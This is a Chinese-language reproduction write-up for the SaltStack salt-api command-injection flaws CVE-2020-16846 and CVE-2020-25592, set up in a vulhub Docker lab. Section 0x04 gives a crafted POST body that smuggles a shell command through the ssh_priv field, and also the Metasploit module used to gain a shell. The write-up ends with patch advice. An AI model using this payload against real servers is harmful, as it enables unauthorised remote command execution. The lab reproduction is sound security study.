## **0x0** **0** **简介**

SaltStack是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，基于Python语言实现，结合轻量级消息队列（ZeroMQ）与Python第三方模块（Pyzmq、PyCrypto、Pyjinjia2、python-msgpack和PyYAML等）构建。通过部署SaltStack，我们可以在成千万台服务器上做到批量执行命令，根据不同业务进行配置集中化管理、分发文件、采集服务器数据、操作系统基础及软件包管理等。

##  **0x01漏洞概述**

CVE-2020-16846和CVE-2020-25592组合使用可在未授权的情况下通过salt-api接口执行任意命令。CVE-2020-25592允许任意用户调用SSH模块，CVE-2020-16846允许用户执行任意命令。

##  **0x02影响版本**

> SaltStack 2015/2016/2017/2018/2019/3000/3001/3002

##  **0x03环境搭建**

1、本次漏洞手动搭建较为复杂，使用vulhub中的docker环境搭建下载并解压

    
    
    wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
    
    unzip vulhub-master.zip

2、进入漏洞目录使用docker-compose启动漏洞环境，看到绿色done表示启动成功

    
    
    cd vulhub/saltstack/CVE-2020-16846/
    
    docker-compose up -d

![1614926147_6041d143305bbb1e539fe.png!small](https://image.3001.net/images/20210305/1614926147_6041d143305bbb1e539fe.png!small)

3、在浏览器访问https://your-ip:8000这是Salt的API端口。 **注：需要https访问**

![1614926150_6041d146283b59c68af6e.png!small](https://image.3001.net/images/20210305/1614926150_6041d146283b59c68af6e.png!small)

##  **0x04漏洞复现**

1、在url访问以下链接，使用burp进行抓包并发送到重放模块

> https://your-ip:8000/run

![1614926156_6041d14c329b855359109.png!small](https://image.3001.net/images/20210305/1614926156_6041d14c329b855359109.png!small)

2、将get修改为post传输，构造以下数据包写入文件，点击发送

    
    
    token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b

![1614926159_6041d14f804713e415387.png!small](https://image.3001.net/images/20210305/1614926159_6041d14f804713e415387.png!small)

3、返回200ok，进入到docker容器中查看文件成功写入

![1614926162_6041d1522eb699c1bad13.png!small](https://image.3001.net/images/20210305/1614926162_6041d1522eb699c1bad13.png!small)

![1614926165_6041d1553b982bb5b5722.png!small](https://image.3001.net/images/20210305/1614926165_6041d1553b982bb5b5722.png!small)

4、使用msf中的exp进行漏洞利用，启动msf，选择攻击模块，配置信息，使用run或exploit执行，执行后拿到shell

    
    
    msfconsole
    
    use exploit/linux/http/saltstack_salt_api_cmd_exec
    
    show options

![1614926171_6041d15b3d7e6c54c49f1.png!small](https://image.3001.net/images/20210305/1614926171_6041d15b3d7e6c54c49f1.png!small)

![1614926173_6041d15dd054fc76bc2b4.png!small](https://image.3001.net/images/20210305/1614926173_6041d15dd054fc76bc2b4.png!small)

##  **0x05修复建议**

1、建议在官方下载安装此漏洞补丁，补丁下载地址：

https://gitlab.com/saltstack/open/salt-patches

2、升级至安全版本，下载地址：

https://repo.saltstack.com/

